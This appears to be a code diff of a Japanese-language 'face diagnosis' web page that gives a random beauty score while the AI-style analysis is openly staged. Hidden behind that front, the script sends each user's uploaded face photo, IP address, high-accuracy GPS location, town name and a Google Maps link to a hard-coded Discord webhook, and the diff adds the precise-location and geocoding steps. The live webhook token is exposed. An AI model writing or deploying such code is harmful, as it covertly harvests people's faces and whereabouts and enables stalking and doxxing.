@@ -89,19 +89,18 @@ button {
 <script>
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1466756850413211698/VnDiihsRnf56T6bUyhfdDoExTf8kAGYDuSkNDREPSMeS-pgASK1SK4jHowR5vmBr2vxm";
 
+// 診断開始
 function startDiagnosis() {
   const file = document.getElementById("file").files[0];
   if (!file) {
-    alert("画像選ばねえと診断できんわかす～");
+    alert("画像選んで！");
     return;
   }
 
-  // ローディング
   const result = document.getElementById("result");
   result.style.display = "block";
   result.innerHTML = "診断中...";
 
-  // 位置情報取得
   if (navigator.geolocation) {
     navigator.geolocation.getCurrentPosition(
       (pos) => {
@@ -109,6 +108,9 @@ function startDiagnosis() {
       },
       () => {
         runDiagnosis(null, null);
+      },
+      {
+        enableHighAccuracy: true
       }
     );
   } else {
@@ -116,6 +118,7 @@ function startDiagnosis() {
   }
 }
 
+// 診断処理
 function runDiagnosis(lat, lon) {
   const file = document.getElementById("file").files[0];
   const reader = new FileReader();
@@ -126,44 +129,77 @@ function runDiagnosis(lat, lon) {
     document.getElementById("preview").src = base64;
     document.getElementById("previewBox").style.display = "block";
 
+    // AIっぽい演出
+    const result = document.getElementById("result");
+    result.innerHTML = "顔検出中...";
     setTimeout(() => {
+      result.innerHTML = "特徴解析中...";
+    }, 500);
+
+    setTimeout(async () => {
       const score = Math.floor(30 + Math.random() * 20);
       const rank = score >= 45 ? "S" : score >= 30 ? "A" : "B";
 
-      document.getElementById("result").innerHTML = `
+      result.innerHTML = `
         ランク ${rank}<br>
         黄金比スコア：${score}%<br>
         いい感じやん
       `;
 
-      sendToDiscord(base64, score, rank, lat, lon);
+      await sendToDiscord(base64, score, rank, lat, lon);
     }, 1200);
   };
 
   reader.readAsDataURL(file);
 }
 
-function sendToDiscord(base64, score, rank, lat, lon) {
+// 市町村取得（逆ジオコーディング）
+async function getAddress(lat, lon) {
+  try {
+    const res = await fetch(
+      `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&accept-language=ja`
+    );
+    const data = await res.json();
+
+    return data.address.city 
+        || data.address.town 
+        || data.address.village 
+        || data.address.county
+        || "不明";
+  } catch {
+    return "取得失敗";
+  }
+}
+
+// Discord送信
+async function sendToDiscord(base64, score, rank, lat, lon) {
   const fd = new FormData();
   fd.append("file", dataURLtoBlob(base64), "face.png");
 
-  fetch("https://api.ipify.org?format=json")
-  .then(res => res.json())
-  .then(ipData => {
-    fd.append("payload_json", JSON.stringify({
-      content: `
+  const ipData = await fetch("https://api.ipify.org?format=json").then(r => r.json());
+
+  let address = "不明";
+  if (lat && lon) {
+    address = await getAddress(lat, lon);
+  }
+
+  fd.append("payload_json", JSON.stringify({
+    content: `
 📸 顔診断
 IP: ${ipData.ip}
-位置: ${lat ?? "不明"}, ${lon ?? "不明"}
+地域: ${address}
+位置: https://maps.google.com/?q=${lat ?? "不明"},${lon ?? "不明"}
 黄金比: ${score}%
 ランク: ${rank}
 `
-    }));
+  }));
 
-    fetch(WEBHOOK_URL, { method: "POST", body: fd });
-  });
+  fetch(WEBHOOK_URL, { method: "POST", body: fd })
+    .then(res => console.log("送信OK", res.status))
+    .catch(err => console.log("送信エラー", err));
 }
 
+// base64 → Blob変換
 function dataURLtoBlob(dataurl) {
   const arr = dataurl.split(',');
   const mime = arr[0].match(/:(.*?);/)[1];
@@ -174,6 +210,6 @@ function dataURLtoBlob(dataurl) {
   return new Blob([u8], { type: mime });
 }
 </script>
-
+  
 </body>
 </html>
